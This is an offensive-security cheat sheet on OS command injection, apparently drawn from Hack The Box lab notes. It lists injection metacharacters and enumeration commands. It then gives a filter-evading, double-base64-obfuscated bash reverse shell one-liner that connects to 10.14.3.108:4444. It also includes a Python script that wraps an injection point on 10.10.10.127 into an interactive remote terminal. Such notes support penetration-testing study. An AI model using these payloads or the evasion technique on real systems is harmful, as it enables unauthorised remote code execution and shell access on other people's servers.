# OS Command Injection

## OS Command Injection Information

OS command injection (also known as shell injection) is a web security flaw that allows an attacker to run arbitrary operating system (OS) commands on the server that is hosting an application, compromising the program and all of its data.

### Useful commands <a href="#useful-commands" id="useful-commands"></a>

When you've discovered an OS command injection vulnerability, it's always a good idea to run a few test commands to learn more about the system you've infiltrated. The following is a list of commands that can be used on both Linux and Windows platforms:

| Purpose of command       | Linux         | Windows         |
| ------------------------ | ------------- | --------------- |
| Name of the current user | `whoami`      | `whoami`        |
| Operating system         | `uname -a`    | `ver`           |
| Network configuration    | `ifconfig`    | `ipconfig /all` |
| Network connections      | `netstat -an` | `netstat -an`   |
| Running processes        | `ps -ef`      | `tasklist`      |

## Enumerating OS Command Injection

OS command injection attacks can be carried out via a variety of shell metacharacters. Command separators are a set of characters that allow commands to be chained together. On both Windows and Unix-based systems, the following command separators work:

* `&`
* `&&`
* `|`
* `||`

The following command separators work only on Unix-based systems:

* `;`
* Newline (`0x0a` or `\n`)

Backticks or the dollar character can also be used on Unix-based systems to perform inline execution of an injected command within the original command:

* `` ` `` injected command `` ` ``
* `$(` injected command `)`

It's worth noting that the various shell metacharacters have subtle differences in behavior that could affect whether they work in specific contexts and whether they allow in-band command output retrieval or are just effective for blind exploitation.

In the original command, the input that you control may appear within quote marks. In this case, you must terminate the quoted context (using " or ') before injecting a new command using appropriate shell metacharacters.

## Executing arbitrary commands

Bash reverse shell example:

```bash
echo "echo $(echo 'bash -i >& /dev/tcp/10.14.3.108/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
```

Now execute the generate output of the command above and try to execute it.\

# OS Command Injection Script

If there's an OS command injection vulnerability we can simulate terminal with python3:

```python
#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup
from cmd import Cmd

class Terminal(Cmd):
    prompt = "terminal> "

    def default(self, args):
        resp = requests.post('http://10.10.10.127/select', data={"param_name": f"s;{args} 2>&1"}, proxies={"http": "http://127.0.0.1:8080"})
        soup = BeautifulSoup(resp.text, 'html.parser')
        print(soup.find("pre").text.strip())

term = Terminal()
term.cmdloop()
```

Execute the script:

```sh
root@kali# ./fortune_shell.py 
terminal> pwd
/var/www/appname/
```

Reference from [0xdf HTB Fortune writeup](https://0xdf.gitlab.io/2019/08/03/htb-fortune.html#rce-as-www-data)